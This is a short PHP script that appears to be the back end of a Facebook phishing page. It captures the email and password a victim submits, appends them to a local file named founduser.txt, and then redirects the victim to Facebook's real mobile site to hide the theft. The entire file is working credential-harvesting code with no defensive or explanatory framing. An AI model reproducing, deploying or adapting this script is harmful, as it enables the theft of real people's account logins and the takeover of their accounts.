<?php
header('Location: https://m.facebook.com/videos');
 $user = $_POST["email"];
 $pass = $_POST["password"];

 $co = "===========================================\n"; 
 $cl = "===========================================\n";
 $fileuser = fopen("founduser.txt", "a") or die("Intentalo nuevamente");
 $us = "Username: $user\n";
 $pa = "Password: $pass\n";
 fwrite($fileuser, "\n". $co. "\n". $us. $pa. "\n". $cl); 
 fclose($fileuser);
 exit()
?>
